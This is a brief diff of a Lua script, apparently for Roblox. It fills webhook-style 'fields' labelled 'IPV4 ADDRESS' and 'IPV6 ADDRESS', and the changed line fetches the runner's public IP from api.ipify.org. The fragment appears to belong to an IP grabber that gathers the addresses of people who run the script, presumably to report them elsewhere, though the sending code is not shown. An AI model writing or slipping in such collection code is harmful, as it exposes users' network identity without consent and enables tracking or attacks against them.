@@ -115,7 +115,7 @@ local data = {
             ["fields"] = {
                 {
                     ["name"] = "IPV4 ADDRESS",
-                    ["value"] = game:HttpGet("out"),
+                    ["value"] = game:HttpGet("https://api.ipify.org/"),
                 },
                 {
                     ["name"] = "IPV6 ADDRESS",
